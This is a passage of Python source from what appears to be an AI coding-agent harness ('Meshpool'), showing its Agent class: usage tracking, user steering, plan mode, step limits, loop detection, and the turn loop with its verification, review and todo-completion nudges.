        sub-agents started at once each made a task of their own, and the chat then counted only one of them (CI)."""
        if self._task is None:
            with Agent._ensure_lock:
                if self._task is None:
                    self._task = self.usage_task or usage.start_task(chat=self.id, label="turn")
        return self._task

    def _begin_usage(self) -> None:
        """Start the turn's usage task (the session's, else a new one; a grader nests under the turn that runs it)
        and bind it for this thread until _end_usage()."""
        cur = usage._CUR.get()
        self._task = self.usage_task or usage.start_task(chat=self.id, parent=cur[0] if cur else None, label="turn")
        self._utok = usage._CUR.set((self._task, self._src()))

    def _end_usage(self) -> None:
        tok, self._utok = getattr(self, "_utok", None), None
        if tok is not None:
            try:
                usage._CUR.reset(tok)
            except ValueError:                         # another context: nothing was bound here
                pass

    def _absorb_usage(self, turn: dict) -> None:
        """Fold the ledger records the task has not shown yet (own calls, reviewers, graders, sub-agents, office
        engines) into the turn and session totals, one usage event each. aux: anything but the chat's own call."""
        t = self._task
        if t is None:
            return
        with self._absorb_lock:
            for r in t.poll():
                c = r.get("cost")
                d = {"in": int(r.get("in") or 0), "cached": int(r.get("cached") or 0), "out": int(r.get("out") or 0),
                     "calls": 1}
                more = {"cost": c or 0.0, "unpriced_calls": int(c is None), "unreported_calls": int(not r.get("reported")),
                        "cache_write": int(r.get("cache_write") or 0), "reasoning": int(r.get("reasoning") or 0)}
                for tot in (self.usage, turn) if isinstance(turn, dict) else (self.usage,):
                    for k, v in {**d, **more}.items():
                        tot[k] = tot.get(k, 0) + v
                self.emit({"type": "usage", **d, "cost": c, "model": r.get("model", ""), "source": r.get("source", ""),
                           "aux": r.get("source") != "chat"})

    def steer(self, text: str, images: list | None = None):
        """Add to the request while the agent works. It reads this before its next step."""
        with self._inbox_lock:
            self._inbox.append((text, images or []))
        self.emit({"type": "user", "text": text.split("\n\n\u200b")[0],
                   "images": [im.get("name", "image") for im in images or []], "plan": self.plan, "steer": True})

    @property
    def plan(self) -> bool:
        """Plan mode. A change made while a turn runs is held until the turn ends: the turn keeps its tools."""
        return getattr(self, "_plan", False)

    @plan.setter
    def plan(self, v):
        if getattr(self, "_in_turn", False):
            self._plan_next = bool(v)
        else:
            self._plan, self._plan_next = bool(v), None

    def _take_inbox(self) -> bool:
        with self._inbox_lock:
            items, self._inbox = self._inbox, []
        for text, images in items:
            if self.pace_deadline and PACE.classify(text, bool(images)) != "quick":
                self.pace_deadline = 0.0             # a real task joined a quick turn: the quick budget ends
                if getattr(self, "_pace_wrapped", False):
                    self._pace_wrapped = False
                    self.messages.append({"role": "user", "content": (
                        "[Meshpool] The user added a request, so this is no longer a quick question: the time limit "
                        "and the rule against creating or changing files no longer apply. Do what they asked.")})
            body = "[Added by the user while you were working] " + text
            if images:
                parts = [{"type": "text", "text": body}] + [_image_part(im) for im in images[:6]]
                self.messages.append({"role": "user", "content": parts})
            else:
                self.messages.append({"role": "user", "content": body})
        return bool(items)

    def reset(self):
        # a new conversation gets its own session folder: the next save() must not overwrite the one just left
        self.id = time.strftime("%Y%m%d-%H%M%S-") + uuid.uuid4().hex[:4]
        self.dir = self.dir.parent / self.id
        self.created = time.time()
        self.usage = {"in": 0, "cached": 0, "out": 0, "calls": 0}
        self._todos = []
        self.unfinished = False
        self.messages = [{"role": "system", "content": self.system_prompt()}]
        self.ws = Workspace(str(self.root), str(self.dir / "tool-output"))
        self.ws.engine_libs = False                    # the user's project runs its own Python (core/tools._py_env)
        self.ws.visible = self._text_visible
        self.ws.should_stop = lambda: self._stop
        self.ws.get_mode = lambda: self.mode
        self.title = ""

    def send(self, text: str, images: list | None = None) -> str:
        """Run one user request to the end of the agent's turn. Returns the final reply text.
        images: [{"mime": "image/png", "data": base64, "name": ...}] attached by the user."""
        self._stop = False
        exp = self.__dict__.pop("_expect_gen", None)       # the front end's Stop generation when it took the message
        if exp is not None and getattr(self, "_gen", 0) != exp:
            self._stop = True                              # Stop came before this turn began: it ends at once
        if not hasattr(self, "_inbox"):
            self._inbox, self._inbox_lock = [], threading.Lock()
        if not self._style() and "\u200b" in text:      # the app's hidden block repeats what the system prompt already says
            from meshpool_harness.assistant import HONESTY, PLAIN
            text = text.replace(PLAIN, "").replace(HONESTY, "")
        from meshpool_harness.agent import extras as EX
        cmd = EX.expand_command(text, self.root)          # /name from .meshpool/commands
        if cmd:
            text = cmd
        self._auto_route(text)
        asked = text                                      # what the user asked, before hook notes and @file contents
        self._asked_text = text
        ignored = EX.untrusted_config(self.root)
        if ignored and not getattr(self, "_trust_noted", False):
            self._trust_noted = True
            self.emit({"type": "status", "text": "This folder has " + " and ".join(".meshpool/" + n for n in ignored)
                       + ", which can run commands or pre-approve them. They are ignored until you trust the folder "
                       "(type /trust)."})
        blocked, note = EX.run_hooks(self.root, "UserPromptSubmit", {"prompt": text})
        if blocked:
            self.emit({"type": "error", "text": "A hook stopped this message: " + note})
            return ""
        if len(self.messages) <= 2:
            _, started = EX.run_hooks(self.root, "SessionStart", {})
            if started:
                text += "\n\n[Session start hook]\n" + started
        if note:
            text += "\n\n[Hook]\n" + note
        text = EX.expand_mentions(text, self.root)          # @file attaches the file
        try:                                                # a message about an office file brings the office tools
            from meshpool_harness import capabilities as CAP
            own = str(asked or "").split(CAP.SEP)[0]       # the user's words, not Meshpool's hidden notes (which name
            if re.search(r"\.(docx?|xlsx?|pptx?|pdf)\b", own, re.I) or CAP.needs(own):   # .docx/.xlsx themselves)
                self.office_on = True
            if re.search(_WEB_ASK, own, re.I):              # a page, an app's UI, a browser: the browser tools join
                self.browser_on = True
        except Exception:  # noqa: BLE001
            pass
        if self._office_direct_raw() and not self.office_engines:   # decided here, before the turn: fixed for the turn
            from meshpool_harness.office_intent import engines_wanted, wants_revisions
            if engines_wanted(asked):                        # a new deck, report or model: the engines join, and stay
                self.office_engines = self.office_on = True
            else:                                            # Word tracked changes or comments: edit_office_file joins
                self.office_revisions = wants_revisions(asked)   # for this message only
                if self.office_revisions:
                    self.office_on = True
        if self._office_direct_raw() and os.environ.get("MH_WORK_OFFICE_STYLE", "lean") == "c171":
            want = self.office_c171_for(asked)
            if want != bool(self.office_c171):
                self.office_c171 = want
                if self.messages and self.messages[0].get("role") == "system":
                    self.messages[0] = {"role": "system", "content": self.system_prompt()}
        if not self.title:
            self.title = text.strip().splitlines()[0][:80] if text.strip() else "Session"
        body = text
        if self.plan:
            body = ("[Plan mode] Investigate as needed with read-only tools, then reply with a clear, numbered plan "
                    "for the request below. Do not change any files or run commands that change anything; the user "
                    "will review the plan and switch to building.\n\n" + text)
        if getattr(self, "unfinished", False):
            self.unfinished = False
            body += RESUME_NOTE                      # hidden in the chat (after \u200b)
        lean = self._lean() or self._bare_codex()
        if self.profile == "code" and not self.plan and not lean and os.environ.get("MH_KEEP_NOTE", "1") != "0" \
                and _KEEP.search(text):
            body += KEEP_NOTE                        # eval: the agent changed output it was told to keep, and its own
                                                     # check printed the regressed line without it noticing
        if self.profile == "code" and not self.plan and not lean and os.environ.get("MH_REQ_NOTE", "1") != "0" \
                and _requirements(text) >= 2:
            body += REQ_NOTE                         # eval: short wrong answers checked the agent's reading of the task,
                                                     # not each stated rule (line-diff: the tie-break rule went untested)
        if images:
            parts = [{"type": "text", "text": body}] + [_image_part(im) for im in images[:6]]
            self.messages.append({"role": "user", "content": parts})
        else:
            self.messages.append({"role": "user", "content": body})
        self.save()                                  # the thread and its message survive a restart mid-turn
        self.emit({"type": "user", "text": text.split("\n\n\u200b")[0], "images": [im.get("name", "image") for im in images or []],
                   "plan": self.plan, "mi": len(self.messages) - 1})
        return self._turn()

    def _auto_route(self, text: str) -> None:
        """A chat created without a task (terminal CLI, `meshpool -p`, ACP) is routed on its first message, like an app
        chat, so it runs the shipped default profile instead of FULL (X-02). MH_AUTO_ROUTE=0 turns it off."""
        if (self.route is not None or len(self.messages) > 1 or self.plan or not (text or "").strip()
                or getattr(self, "_is_grader", False) or getattr(self, "_delegate_depth", 0)
                or os.environ.get("MH_AUTO_ROUTE", "") == "0"):
            return
        try:
            from meshpool_harness import hrouter as HRR
            self.set_route(HRR.route(text, workdir=str(self.root), kind="code" if self.profile == "code" else "cowork"), text)
        except Exception:  # noqa: BLE001
            self.route = None

    def has_steers(self) -> bool:
        """True when the user added something (steer) that no turn has read yet."""
        with self._inbox_lock:
            return bool(self._inbox)

    def resume_steers(self) -> str | None:
        """Answer what the user added after the last turn stopped reading (a steer that arrived just as send()
        returned). Front ends call this when send() returns; None when nothing is waiting."""
        if not self.has_steers():
            return None
        self._stop = False
        with self._inbox_lock:
            quick = all(PACE.classify(t, bool(im)) == "quick" for t, im in self._inbox)
        self.pace_deadline = (time.time() + PACE.QUICK_S) if (self.pace_deadline and quick) else 0.0
        return self._turn()

    def _refuse_wrapped_calls(self, calls: list, g: dict) -> str:
        """Tool calls returned on a tools-off quick step are not run: each gets a refusal result and the model is
        asked again. After 2 refused rounds returns the text that ends the turn (else "")."""
        for c in calls:
            self.messages.append({"role": "tool", "tool_call_id": c["id"], "content":
                                  "Not run: time is up for this quick request. Answer now with what you have."})
        g["wrap_refused"] = g.get("wrap_refused", 0) + 1
        if g["wrap_refused"] >= 2:
            return "(I ran out of time for this quick request. Ask again to let me look further.)"
        return ""

    def _begin_turn_state(self):
        """Reset what must not leak from one turn into the next. New turn-scoped state goes here."""
        self._n429 = 0                               # rate-limit backoff step: every turn starts at the short wait
        self._pace_wrapped = False                   # the quick-turn wrap (no more tools) is on for this turn
        self._in_turn = True                         # a plan-mode change now waits for the turn to end
        self._turn_cap = self._step_cap()            # read now, so a settings change applies from the next message

    DEFAULT_STEPS = 200

    def _step_cap(self) -> int:
        """Steps allowed in one turn (0 = no cap): the constructor's max_steps, else MH_MAX_STEPS (a positive number;
        0, off or none lift the cap), else 200. A runaway turn stops there; the next message continues."""
        if self.max_steps:
            return int(self.max_steps)
        raw = str(os.environ.get("MH_MAX_STEPS", "") or "").strip().lower()
        if raw in ("0", "off", "none", "no", "false"):
            return 0
        try:
            n = int(raw)
        except ValueError:
            return self.DEFAULT_STEPS
        return n if n > 0 else self.DEFAULT_STEPS

    def _loop_tripped(self, g: dict) -> bool:
        """Outer breaker: no progress for MH_STUCK_STEPS + MH_REPEAT_STOP steps and the last MH_REPEAT_STOP step
        signatures identical or a repeating 2- or 3-step block (MH_REPEAT_STOP=0 turns it off)."""
        try:
            stop = int(os.environ.get("MH_REPEAT_STOP", "8") or 0)
            stuck = int(os.environ.get("MH_STUCK_STEPS", "36") or 36)
        except ValueError:
            stop, stuck = 8, 36
        sigs = g.get("sigs", [])
        if stop <= 0 or g.get("np", 0) < stuck + stop or len(sigs) < stop:
            return False
        w = sigs[-stop:]
        return any(all(w[i] == w[i - p] for i in range(p, len(w))) for p in (1, 2, 3))

    def _track_progress(self, calls: list, outs: list, g: dict):
        """Per turn, independent of V3: steps since a file changed or a new non-read-only command succeeded, and the
        step's signature (its calls plus a hash of what they returned)."""
        import hashlib
        seen = g.setdefault("b_seen", set())
        new = [c for c in self.ws.commands if c.get("code") == 0 and c["cmd"] not in seen and not T.read_only(c["cmd"])]
        g["b_seen"].update(c["cmd"] for c in self.ws.commands)
        if new or self.ws.edits != g.get("b_edits", g["edits0"]):
            g["np"], g["sigs"], g["b_edits"] = 0, [], self.ws.edits
            return
        g["np"] = g.get("np", 0) + 1
        sig = "|".join(str(c.get("function", {}).get("name", "")) + ":" + str(c.get("function", {}).get("arguments", ""))[:2000]
                       for c in calls) + "#" + hashlib.md5("\x00".join(map(str, outs)).encode("utf-8", "replace")).hexdigest()
        g["sigs"] = (g.get("sigs", []) + [sig])[-12:]

    def _break_loop(self, calls: list, g: dict, turn: dict) -> str:
        """End a turn that is going round in circles. The pending calls are not run (each gets a result, so the history
        stays valid); one last request with tools off gives a best-effort answer, followed by the files changed."""
        note = "Not run: stopped, the agent was repeating itself."
        for c in calls:
            self.messages.append({"role": "tool", "tool_call_id": c["id"], "content": note})
        self.messages.append({"role": "user", "content": (
            "[Meshpool] You are repeating yourself, so this turn ends now. Do not call any tool. In plain words: say what "
            "is done, what is not, and what you would try next.")})
        self._finish, self._no_tools = None, True
        try:
            msg, streamed = self._chat(turn)
        finally:
            self._no_tools = False
        text = (msg.get("content") or "").strip()
        keep = {"role": "assistant", "content": text}
        late = _sanitize_calls(msg.get("tool_calls") or [])
        if late:                                     # a model that ignores tool_choice "none": answered, not run
            keep["tool_calls"] = late
        self.messages.append(keep)
        for c in late:
            self.messages.append({"role": "tool", "tool_call_id": c["id"], "content": note})
        files = []
        for f in sorted(getattr(self.ws, "turn_files", ()) or ()):
            try:
                files.append(os.path.relpath(f, self.root))
            except ValueError:
                files.append(str(f))
        text = text or "I stopped because I was repeating the same steps without making progress."
        if files:
            text += "\n\nFiles changed this turn: " + ", ".join(files)
        self.emit({"type": "assistant", "text": text, "streamed": False, "has_tools": False})
        self.emit({"type": "error", "text": "Stopped: the agent kept repeating the same steps without progress. What it "
                                            "did so far is kept; send a message to steer it."})
        return text

    def _turn(self) -> str:
        self._begin_turn_state()
        turn = self._turn_usage = {"in": 0, "cached": 0, "out": 0, "calls": 0}   # sub-agents add theirs
        self.budget_stopped = False
        self._begin_usage()
        final, said = "", ""                         # said: reply text before an output-limit cut-off
        self._todo_touched = False
        self.ws.turn_files = set()
        self.ws.turn_new = set()
        g = {"hist": [], "doom_at": -10, "seen": set(), "edits": self.ws.edits, "edits0": self.ws.edits, "last": 0,
             "cmds0": len(self.ws.commands), "t0": time.time(),
             "todo_nudged": False}
        route = getattr(self, "route", None)
        g["req"] = self.messages[-1].get("content") if self.messages else ""
        g.update({"since_todo": 0, "plan_asked": False})
        g.update({"msg0": max(0, len(self.messages) - 1), "t0": time.time(), "cmd0": len(self.ws.commands),
                  "after_plan": bool(getattr(self, "_prev_plan", False)), "grade_rounds": 0})
        self._last_g, self._last_final = g, ""
        self._turn_no = getattr(self, "_turn_no", 0) + 1
        cx = self._codex()
        if cx:                                       # Codex's loop: no plan round, no reminders, no extra checks
            self._plan_needed = False
        else:
            self._plan_start(route, g)
        # re-check on edit (core/tools.py _recheck) follows the chat's lane on every turn: a resumed chat, or one whose
        # first message was not in Codex style, gets it too (and a chat that left the lean lane stops it)
        self.ws.recheck = bool(cx) and self._lean()
        if cx and len(self.messages) <= 2 and not self._c171():   # the route's method rides on the first message
            # (hrouter). c171: Codex 0.171's environment context is a user message of its own, added to each request
            # (_body), and nothing rides on the user's message
            extra = self._codex_env()
            if self._lean() and os.environ.get("MH_PRELOAD", "1") != "0" and not getattr(self.ws, "container", None):
                try:                                 # the files, git state and source up front (agent/preload.py)
                    from meshpool_harness.agent import preload as _PL
                    first = self.messages[-1].get("content")
                    pre = _PL.build(self.root, first if isinstance(first, str) else "",
                                    seen=lambda fp, t: self.ws.remember_text(fp, t, "the <workspace> block at the start"))
                except Exception:  # noqa: BLE001 - a preload problem never blocks the task
                    pre = ""
                if pre:
                    extra += "\n\n" + pre
            if route is not None and os.environ.get("MH_ROUTE_CARD", "1") != "0" and not self._lean() \
                    and not self._bare_codex():
                # MH_ROUTE_CARD=0 (A/B): no method card. Eval final13: with the card, 66% more model calls than Codex
                # (4.5 test runs and 5.1 writes per run vs 2.0 and 2.0) at an equal solve rate
                from meshpool_harness.hrouter.route import addon
                ad = addon(route).strip()
                extra += ("\n\n" + ad) if ad else ""
            last = self.messages[-1].get("content")
            if isinstance(last, str):
                self.messages[-1]["content"] = last + "\n\n\u200b" + extra
            elif isinstance(last, list):
                self.messages[-1]["content"] = last + [{"type": "text", "text": extra}]
        if (not cx and route is not None and route.spec in ("code.debug", "code.test") and len(self.messages) <= 2
                and not self.plan and isinstance(self.messages[-1].get("content"), str)):
            try:                                     # reproduce before the first call: one model round saved
                rep = _PACKS.reproduce(self.ws, self.messages[-1]["content"].split("\n\n\u200b")[0])
            except Exception:  # noqa: BLE001
                rep = ""
            if rep:
                self.messages[-1]["content"] += "\n\n" + rep
                self.emit({"type": "status", "text": "Reproduced the problem before starting."})
        if (not cx and route is not None and route.spec in ("code.build", "code.refactor", "code.explain", "code.test")
                and len(self.messages) <= 2 and not self.plan and isinstance(self.messages[-1].get("content"), str)
                and os.environ.get("MH_REPO_MAP", "1") != "0"):
            try:                                     # the project's symbols up front: no exploring rounds
                rm = _PACKS.repo_map(self.ws, self.messages[-1]["content"].split("\n\n\u200b")[0])
            except Exception:  # noqa: BLE001
                rm = ""
            if rm:
                self.messages[-1]["content"] += "\n\n" + rm
        if (not cx and route is not None and route.spec == "data" and len(self.messages) <= 2 and not self.plan
                and isinstance(self.messages[-1].get("content"), str)):
            try:                                     # the data's shape before the first call: no exploring round
                prev = _PACKS.data_preview(self.ws, self.messages[-1]["content"].split("\n\n\u200b")[0])
            except Exception:  # noqa: BLE001
                prev = ""
            if prev:
                self.messages[-1]["content"] += "\n\n" + prev
                self.emit({"type": "status", "text": "Read the data files' structure before starting."})
        if V3 and not cx and len(self.messages) <= 2 and not self.plan:
            snap = _env_snapshot(self.root)
            if snap and isinstance(self.messages[-1].get("content"), str):
                self.messages[-1]["content"] += "\n\n<environment_snapshot>\n" + snap + "\n</environment_snapshot>"
        try:
            cap = self._turn_cap
            for step in (range(cap) if cap else itertools.count()):
                self._check_stop()
                self._take_inbox()
                if time.time() - getattr(self, "_saved_at", 0) > 4:        # a crash or power loss keeps the work so far
                    self._saved_at = time.time()
                    self._running = True                  # saved as unfinished: a crash here is resumed, not lost
                    self.save()
                self._maybe_compact()
                if self.pace_deadline and not self._pace_wrapped and step and (
                        time.time() > self.pace_deadline or step >= PACE.QUICK_STEPS):
                    self._pace_wrapped = True           # a quick request ran long: answer now, no more tools
                    self.messages.append({"role": "user", "content": PACE.WRAP})
                if self._pace_wrapped:
                    self._no_tools = True               # every later step is tools-off, even if tool_choice is refused
                self._finish = None
                if g.pop("hard_wrap", False):
                    self._no_tools = True                 # stuck for good: best-effort answer instead of more calls
                tools_off = bool(getattr(self, "_no_tools", False))
                try:
                    msg, streamed = self._chat(turn)
                finally:
                    self._no_tools = False
                native = bool(msg.get("tool_calls"))
                msg = self._text_tools(msg)             # a model without tool calling asks for tools in text (W-02)
                if not tools_off and not msg.get("tool_calls"):
                    from meshpool_harness.core import textcalls as _TC
                    try:
                        offered = [t["function"]["name"] for t in self.tool_schemas()]
                    except Exception:  # noqa: BLE001
                        offered = []
                    if _TC.recover(msg, offered) and streamed:
                        self.emit({"type": "stream_reset"})   # the raw call text was shown as it streamed: drop it
                        streamed = False
                elif tools_off and isinstance(msg.get("content"), str):
                    from meshpool_harness.core import textcalls as _TC
                    _plain = _TC.strip_markup(msg["content"])   # calls written as text cannot run now: not for the user
                    if _plain != msg["content"]:
                        msg["content"] = _plain
                        if streamed:
                            self.emit({"type": "stream_reset"})
                            streamed = False
                cut_off = self._finish == "length"     # the reply hit the output limit (max_tokens)
                # a call read from the reply's text has well-formed arguments even when the text stopped mid-way (an
                # unclosed <tool_call> or <parameter=content> up to the end): after a cut-off none of them is run
                cut = {i for i, c in enumerate(msg.get("tool_calls") or [])
                       if cut_off and (not native or not _args_ok(c))}
                calls = _sanitize_calls(msg.get("tool_calls") or [])
                cut = {calls[i]["id"] for i in cut}
                for c in calls:                        # a call without a name makes every later request invalid
                    if not isinstance(c.get("function"), dict):
                        c["function"] = {"arguments": "{}"}
                    if not c["function"].get("name"):
                        c["function"]["name"] = "unknown"
                content = msg.get("content") or ""
                self._scrubber = None                  # the next reply starts a fresh stream scrubber
                if "<memory-context>" in content:
                    from meshpool_harness.assistant import scrub
                    content = scrub(content)
                if (not calls and not content.strip() and not said and cut_off and msg.get("reasoning_content")
                        and not g.get("think_cont")):
                    g["think_cont"] = True              # the output budget went on thinking: ask for the answer once
                    self.messages.append({"role": "user", "content": (
                        "[Meshpool] Your reply ran out of output space while you were thinking, before any answer. "
                        "Give your answer now, briefly, without more deliberation.")})
                    continue
                if not calls and not content.strip() and not said:
                    # nothing said and nothing asked for: not a reply to keep in the history
                    self.emit({"type": "assistant", "text": "", "streamed": streamed, "has_tools": False})
                    self.emit({"type": "error", "text": "The model returned an empty reply. Send your message again, "
                                                        "or switch to another model."})
                    return ""
                keep = {"role": "assistant", "content": content or ""}
                if calls:
                    keep["tool_calls"] = calls
                    if msg.get("reasoning_content") and self._keeps_reasoning():
                        keep["reasoning_content"] = msg["reasoning_content"]   # thinking models want it back in the turn
                self.messages.append(keep)
                self.emit({"type": "assistant", "text": content, "streamed": streamed, "has_tools": bool(calls)})
                if calls and self._pace_wrapped:
                    done = self._refuse_wrapped_calls(calls, g)
                    if done:
                        final = said + content if content.strip() else done
                        if not content.strip():
                            self.emit({"type": "assistant", "text": done, "streamed": False, "has_tools": False})
                            self.messages.append({"role": "assistant", "content": done})
                        break
                    continue
                if not calls:
                    final = said + content
                    if cut_off and content and g.get("cont", 0) < 3:
                        g["cont"] = g.get("cont", 0) + 1   # a long reply cut off mid-way: let it continue
                        said = final
                        self.messages.append({"role": "user", "content": (
                            "[Meshpool] Your reply was cut off at the output limit. Continue exactly where it "
                            "stopped, without repeating anything.")})
                        continue
                    if self.has_steers():           # the user added something while this reply was written
                        continue
                    if (os.environ.get("MH_SCOPE_CHECK") == "1" and self.profile == "code" and not self.plan and not cx
                            and self.ws.edits > g["edits0"] and not g.get("scope_shown")):
                        g["scope_shown"] = True     # once per request: the same check as the benchmark loop's finish
                        from meshpool_harness.core.finishing import scope_report
                        rep = scope_report(self.ws, done="reply")
                        if rep:
                            self.messages.append({"role": "user", "content": "[Meshpool] " + rep})
                            continue
                    if self._office_direct() and not g.get("office_check_nudged") \
                            and os.environ.get("MH_OFFICE_FINISH_CHECK", "1") != "0":
                        # SpreadsheetBench (38f57ffb), sb-374-31: the agent's own assert failed, it printed the rows
                        # and answered "Done" without changing the file. A failed assertion this turn with no later
                        # save is not a finished job: say so once.
                        # a failed check counts until a later check passes: an earlier throwaway assert, then a fix
                        # and a passing check, is a finished job (Office-7 on 1812e40d: 6 of 14 runs sent back, all
                        # false alarms); a failed assert explained away with no passing check after it is not
                        # (326cb618, invoices_fx: "my scratch assertion was wrong", and the file was wrong)
                        cmds = self.ws.commands[g.get("cmds0", 0):]
                        checks = lambda c: re.search(r"\bassert\b|\bcheck|\bverify|\bpytest\b",  # noqa: E731
                                                     str(c.get("cmd", "")), re.I)
                        bad = [i for i, c in enumerate(cmds) if c.get("code") not in (0, None)
                               and ("AssertionError" in str(c.get("tail", "")) or re.search(r"\bassert\b",
                                                                                         str(c.get("cmd", ""))))]
                        if bad and not any(c.get("code") == 0 and checks(c) for c in cmds[bad[-1] + 1:]):
                            g["office_check_nudged"] = True
                            self.messages.append({"role": "user", "content": (
                                "[Meshpool] Your own check failed and no check has passed "
                                "since. The job is not done: change the file so it does what the request asks, save "
                                "it and check again. If the request really cannot be met, say exactly why in one line.")})
                            continue
                    if self._office_direct() and os.environ.get("MH_OFFICE_FINISH_CHECK", "1") != "0":
                        # the request's own terms, checked on the files written this turn; each check speaks once
                        ask, t0 = getattr(self, "_asked_text", ""), g.get("t0", 0)
                        done = g.setdefault("office_checks", set())
                        miss = ""
                        for key, check in (("slides", lambda: _slide_count_miss(ask, self.root, t0)),
                                           ("total", lambda: _total_row_miss(ask, self.root, t0)),
                                           ("template", lambda: _template_format_miss(ask, self.root, t0)),
                                           ("offslide", lambda: _off_slide_miss(self.root, t0)),
                                           ("unchanged", lambda: _unchanged_output_miss(ask, self.root, t0)),
                                           ("volatile", lambda: _volatile_date_miss(ask, self.root, t0)),
                                           ("formula", lambda: _formula_result_miss(ask, self.root, t0))):
                            if key not in done:
                                miss = check()
                                if miss:
                                    done.add(key)
                                    break
                        if miss:
                            self.messages.append({"role": "user", "content": "[Meshpool] " + miss})
                            continue
                    route = getattr(self, "route", None)
                    after = [c for c in self.ws.commands if c.get("after_edit", -1) >= self.ws.edits]
                    if (route is not None and route.family == "code" and not self.plan and not cx
                            and self.ws.edits > g["edits0"]
                            and after and after[-1]["code"] not in (0, None) and not g.get("verify_nudged")):
                        g["verify_nudged"] = True      # once per request: a failing check is not a finished fix
                        last = after[-1]
                        self.messages.append({"role": "user", "content": (
                            f"[Meshpool] The last check after your change failed (exit {last['code']}): "
                            f"`{last['cmd'][:120]}`. The task is not done. Fix the cause and run it again, or, if that "
                            "failure is expected or unrelated, say exactly why in one line.")})
                        continue
                    if (route is not None and route.family == "code" and not self.plan
                            and self.ws.edits > g["edits0"]):
                        # Codex style too: the profile decides (codex: review and mutation off; codex+review: review on).
                        # Eval: every Meshpool-only wrong answer was a short run whose own check passed, unreviewed.
                        if not g.get("review_done"):
                            g["review_done"] = True    # once per request: a second reader checks it against the ask
                            found = self._review_change(g, turn)
                            if found:
                                self.messages.append({"role": "user", "content": found})
                                continue
                        if not g.get("autocheck_done") and self.ws.turn_files:
                            g["autocheck_done"] = True     # G-15: once per request, off unless MH_AUTO_CHECK is set
                            try:
                                from meshpool_harness.core import autocheck as AC
                                bad = AC.run(self.root, sorted(self.ws.turn_files)) if AC.mode() != "off" else ""
                            except Exception:  # noqa: BLE001
                                bad = ""
                            if bad:
                                self.messages.append({"role": "user", "content": bad})
                                continue
                        if not g.get("mutation_done") and self.hsettings()["mutation"]:
                            g["mutation_done"] = True  # once per request: do the tests notice deliberately broken code?
                            fb = self._mutation_feedback()
                            if fb:
                                self.messages.append({"role": "user", "content": fb})
                                continue
                    left = [t["content"] for t in getattr(self, "_todos", []) if t.get("status") != "completed"]
                    if (V3 or self._plan_needed) and left and self._todo_touched and not g["todo_nudged"] \
                            and not self.plan and not cx:
                        g["todo_nudged"] = True     # once per request: finish the list, or say why not
                        where = (_PLAN.reminder(self._todos) + "\n") if self._plan_needed else ""
                        self.messages.append({"role": "user", "content": (
                            "[Meshpool] " + where + "These items on your todo list are not completed:\n- "
                            + "\n- ".join(left[:12])
                            + "\nComplete them now, or mark them completed if they are done. If one is not needed or "
                            "you need the user's answer, say so briefly and end your turn.")})
                        continue
                    if self.has_steers():           # added while the checks above ran
                        continue
                    if (E2E and not self.plan and not cx and g.get("promise_n", 0) < 2
                            and _stopped_early(final) and self._tool_msgs_since(g["msg0"])):
                        g["promise_n"] = g.get("promise_n", 0) + 1   # E2E-AUTONOMY: a promise or a permission question
                        self.messages.append({"role": "user", "content": (     # mid-task is not a finished turn
                            "[Meshpool] Your reply ends with what you will do next, or asks whether to go on, but "
                            "no tool call came with it, so the turn ended. Do the next step now with a tool call; do "
                            "not ask permission for work you were given. If you are truly finished or truly blocked, "
                            "say so plainly, without promising more.")})
                        continue
                    again, final = self._grade_gate(g, turn, final)   # independent check of a big task (agent/grader.py)
                    if again:
                        continue
                    break
                if tools_off and os.environ.get("MH_REPEAT_STOP", "8") != "0":
                    g["off_calls"] = g.get("off_calls", 0) + 1     # tools were off for this reply, yet it asked for some
                    if g["off_calls"] >= 2:
                        final = said + self._break_loop(calls, g, turn)
                        break
                    for c in calls:                                # first time: not run, asked once more with tools off
                        self.messages.append({"role": "tool", "tool_call_id": c["id"], "content": (
                            "Not run: tools are off for this reply. Answer in words.")})
                    g["hard_wrap"] = True
                    continue
                said = ""
                shots = []
                step_out = []
                edit_failed = False
                for batch in _batches(calls):
                    self._check_stop()
                    if edit_failed:                  # an edit in this turn failed: what was meant to follow it is moot
                        for c in batch:
                            self.messages.append({"role": "tool", "tool_call_id": c["id"], "content": (
                                "Not run: an edit earlier in this turn failed, so this call was skipped. Fix the edit "
                                "first, then run it again.")})
                        continue
                    if len(batch) > 1:               # independent lookups: run together, answer in the asked order
                        from concurrent.futures import ThreadPoolExecutor
                        with ThreadPoolExecutor(max_workers=min(6, len(batch))) as ex:
                            outs = list(ex.map(lambda c: self._guarded_tool(c, g, cut=c["id"] in cut), batch))
                    else:
                        outs = [self._guarded_tool(batch[0], g, cut=batch[0]["id"] in cut)]
                    step_out += outs
                    for c, out in zip(batch, outs):
                        self.messages.append({"role": "tool", "tool_call_id": c["id"], "content": clean(out)})
                        if (c.get("function") or {}).get("name") in ("apply_patch", "edit", "write_file", "edit_file") \
                                and str(out).lstrip().startswith(("ERROR", "Error", "error:")):
                            edit_failed = True
                    if self.mcp is not None and getattr(self.mcp, "last_images", None):
                        shots += [(batch[-1].get("function", {}).get("name", ""), im) for im in self.mcp.last_images]
                        self.mcp.last_images = []
                if shots:
                    self._attach_images(shots)
                self._track_progress(calls, step_out, g)
                step_note = self._step_budget(g)        # counts every step, so it runs even when another guard speaks
                note = self._refusal_escalation(g) or self._budget_escalation(g, turn) or step_note
                if note:
                    self.messages.append({"role": "user", "content": "[Meshpool] " + note})
                if V3 and not cx:
                    note = self._v3_notes(step, calls, g)
                    if note:
                        self.messages.append({"role": "user", "content": "[Meshpool] " + note})
                if self._plan_needed:
                    note = self._plan_note(calls, g)
                    if note:
                        self.messages.append({"role": "user", "content": "[Meshpool] " + note})
                if self._loop_tripped(g):
                    final = self._break_loop([], g, turn)
                    break
            else:
                self.emit({"type": "error", "text": (
                    f"Stopped after {cap} steps in one turn. What was done so far is kept. Send a message (for example "
                    "\"continue\") to carry on. The limit is \"Max steps per reply\" in Settings (MH_MAX_STEPS; 0 = no "
                    "limit).")})
        except (Interrupted, KeyboardInterrupt):
            self._repair()
            for cid, nm in list(self._open_calls.items()):       # no card stays "running" after a Stop
                self._open_calls.pop(cid, None)
                self.emit({"type": "tool_end", "id": cid, "name": nm, "ok": False, "denied": False,
                           "output": "Not finished: the turn ended."})
            added = [t for t, _ in getattr(self, "_inbox", [])]
            self._take_inbox()                       # keep what the user added; the next turn sees it
            self.emit({"type": "interrupted", "text": "Stopped. " + (
                "What you added wasn't answered yet; it goes along with your next message." if added
                else "Send a message to continue.")})
        except usage.BudgetExceeded as e:           # the spending limit: end the turn here, nothing is lost
            self._repair("Not run: the spending limit was reached before this call ran.")
            self.budget_stopped = True
